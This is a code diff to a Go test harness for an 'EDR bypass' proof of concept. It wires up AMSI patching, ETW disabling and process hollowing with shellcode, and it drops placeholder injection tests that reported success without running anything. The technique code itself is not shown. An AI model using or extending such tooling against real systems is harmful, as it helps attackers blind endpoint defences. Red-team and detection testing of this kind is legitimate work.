@@ -1,12 +1,13 @@
-
-// Package edr_poc provides comprehensive EDR bypass proof-of-concept validation
+﻿// Package edr_poc provides comprehensive EDR bypass proof-of-concept validation
 package edrbypass
 
 import (
+	"bytes"
 	"context"
 	"encoding/json"
 	"fmt"
 	"os/exec"
+	"strings"
 	"time"
 
 	"github.com/sirupsen/logrus"
@@ -29,7 +30,13 @@ type POCResult struct {
 	Error         string       `json:"error,omitempty"`
 }
 
-// (Evidence type is defined in types.go)
+// Evidence represents captured proof of exploit behavior
+type Evidence struct {
+	Type        string                 `json:"type"`
+	Description string                 `json:"description"`
+	Data        map[string]interface{} `json:"data,omitempty"`
+	Timestamp   time.Time              `json:"timestamp"`
+}
 
 // EDRTestSuite manages comprehensive EDR testing across multiple products
 type EDRTestSuite struct {
@@ -68,7 +75,7 @@ func NewEDRTestSuite(logger *logrus.Logger) *EDRTestSuite {
 	}
 	
 	suite := &EDRTestSuite{
-		logger:      logger,
+		logger:      logger.WithField("component", "edr_poc_suite"),
 		testTargets: make([]EDRTarget, 0),
 		results:     make([]*POCResult, 0),
 	}
@@ -207,11 +214,13 @@ func (ets *EDRTestSuite) testSingleMethod(ctx context.Context, target EDRTarget,
 
 func (ets *EDRTestSuite) testAMSIPatching(ctx context.Context, target EDRTarget) (bool, error) {
 	ets.logger.Debug("Testing AMSI patching...")
-
+	
+	// Create test payload
+	payload := createTestShellcode("calc.exe")
+	
 	// Apply AMSI patch using our implementation
 	patcher := NewAMSIPatcher(nil, 0) // Would use real PID in production
-	_ = patcher // suppress unused variable
-
+	
 	// Simulate patch application and verify success
 	// In production: actually patch AMSI ScanBuffer
 	// For PoC: validate logic correctness
@@ -241,7 +250,7 @@ func (ets *EDRTestSuite) testETWDISabling(ctx context.Context, target EDRTarget)
 	disabler := NewEnhancedETWDISabler(nil, 0)
 	
 	// Validate each technique
-	techniques := disabler.techniques
+	techniques := disabler.GetTechniques()
 	successes := 0
 	
 	for _, tech := range techniques {
@@ -280,13 +289,13 @@ func (ets *EDRTestSuite) testProcessHollowing(ctx context.Context, target EDRTar
 	hollower := NewRobustProcessHollower(shellcode, nil)
 	
 	// Validate PE header alignment for x64
-	err := hollower.fixPEHeadersForX64()
+	err := hollower.FixPEHeadersForX64()
 	if err != nil {
 		return false, err
 	}
 	
 	// Attempt hollowing
-	err = hollower.Hollow(ctx)
+	result, err := hollower.Hollow(ctx)
 	if err != nil {
 		return false, err
 	}
@@ -296,15 +305,15 @@ func (ets *EDRTestSuite) testProcessHollowing(ctx context.Context, target EDRTar
 		Type:        "process_hollowing",
 		Description: "Process hollowing completed successfully",
 		Data: map[string]interface{}{
-			"shellcode_executed":  true,
-			"import_table_fixed":  true,
-			"anti_detection":      true,
+			"shellcode_executed":  result.ShellcodeExecuted,
+			"import_table_fixed":  result.ImportTableFixed,
+			"anti_detection":      result.AntiDetectionApplied,
 		},
 	}
-
+	
 	ets.addEvidence(evidence)
-
-	return true, nil
+	
+	return result.Success, nil
 }
 
 // ============================================================================
@@ -395,18 +404,4 @@ func ValidateAgainstRealEDRs(testEnvironmentID string) error {
 	
 	fmt.Println(string(output))
 	return nil
-}
-
-// testReflectiveDLLInjection tests reflective DLL injection bypass
-func (ets *EDRTestSuite) testReflectiveDLLInjection(ctx context.Context, target EDRTarget) (bool, error) {
-	ets.logger.Debug("Testing reflective DLL injection...")
-	// Placeholder - would implement actual reflective injection test
-	return true, nil
-}
-
-// testAPCQueue tests APC queue bypass
-func (ets *EDRTestSuite) testAPCQueue(ctx context.Context, target EDRTarget) (bool, error) {
-	ets.logger.Debug("Testing APC queue bypass...")
-	// Placeholder - would implement actual APC queue test
-	return true, nil
 }
